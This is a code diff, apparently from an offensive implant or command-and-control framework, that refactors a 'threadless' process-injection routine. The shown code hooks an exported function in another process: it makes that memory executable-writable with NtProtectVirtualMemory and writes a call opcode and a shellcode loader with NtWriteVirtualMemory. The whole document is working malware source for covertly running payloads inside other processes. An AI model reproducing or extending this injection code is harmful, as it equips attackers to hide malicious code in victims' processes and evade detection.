@@ -1,7 +1,10 @@
 #include <core/corelib/include/inject.hpp>
+#define CALL_X_OFFSET 0x1
+#define EXPORT_OFFSET 0x12
+
 namespace Injection {
 
-    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T ccbShellcode) {
+    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbPayload) {
         // todo: needs MmPivot (Flower)
         HEXANE
 
@@ -22,18 +25,18 @@ namespace Injection {
         auto hookCpy = pHook;
 
         MmPatchData(i, RCAST(PBYTE, &exportCpy), (i), RCAST(PBYTE, &pExport), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Loader.Buffer, (0x12 + i), RCAST(PBYTE, &exportCpy), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Opcode.Buffer, (0x01 + i), RCAST(PBYTE, &LoaderRva), (i), 4)
+        MmPatchData(i, Threadless.Loader.Buffer, (EXPORT_OFFSET + i), RCAST(PBYTE, &exportCpy), (i), sizeof(LPVOID))
+        MmPatchData(i, Threadless.Opcode.Buffer, (CALL_X_OFFSET + i), RCAST(PBYTE, &LoaderRva), (i), 4)
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(PVOID*, &exportCpy), &ccbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(PVOID*, &exportCpy), &cbPayload, PAGE_EXECUTE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, RCAST(PVOID, pExport), RCAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
             || Write != Threadless.Opcode.Length) {
             return;
         }
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &hookCpy), &ccbShellcode, PAGE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &hookCpy), &cbPayload, PAGE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
             Write != Threadless.Loader.Length) {
             return;
